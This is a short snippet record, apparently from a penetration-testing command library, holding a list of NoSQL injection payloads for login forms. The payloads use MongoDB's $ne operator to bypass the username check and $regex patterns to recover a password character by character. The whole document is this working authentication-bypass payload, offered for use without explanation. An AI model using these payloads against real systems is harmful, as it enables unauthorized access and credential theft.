---
id: 2ec00bd2-0f7d-4534-8365-40ca0e07ac0a
name: URL Password Regex Search
type: command
executor: bash
data: 'username[$ne]=toto&password[$regex]=m.{2}

  username[$ne]=toto&password[$regex]=md.{1}

  username[$ne]=toto&password[$regex]=mdp


  username[$ne]=toto&password[$regex]=m.*

  username[$ne]=toto&password[$regex]=md.*'
output: null
created_at: '2023-04-06T03:56:31.467067+00:00'
updated_at: '2023-04-10T20:23:02.396179+00:00'
---

# URL Password Regex Search

```bash
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
```


